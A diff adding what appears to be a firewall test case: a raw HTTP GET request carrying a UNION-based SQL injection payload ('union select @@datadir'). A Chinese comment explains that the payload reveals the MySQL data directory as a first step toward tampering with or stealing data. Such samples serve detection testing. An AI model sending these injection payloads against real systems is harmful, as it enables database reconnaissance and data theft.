@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_普通注入-06506208
+# 攻击者基于UNION查询，将"union select @@datadir"语句注入到 SQL 查询参数中，利用@@datadir这个内置函数获取当前数据库data路径。通过了解当前数据库data路径的信息，从而进一步对数据库进行恶意操作，比如篡改用户信息、窃取敏感数据等。
+GET /?id=1%20union%20select%20@@datadir&bid=hd_tag_m8mv24gf HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24gf
+RM-PRO-Token: d81b629ae6c4448a7143ba68e70a8b16
+RM-PRO-Time: 1742808381079
+User-Agent: curl/7.83.1
+
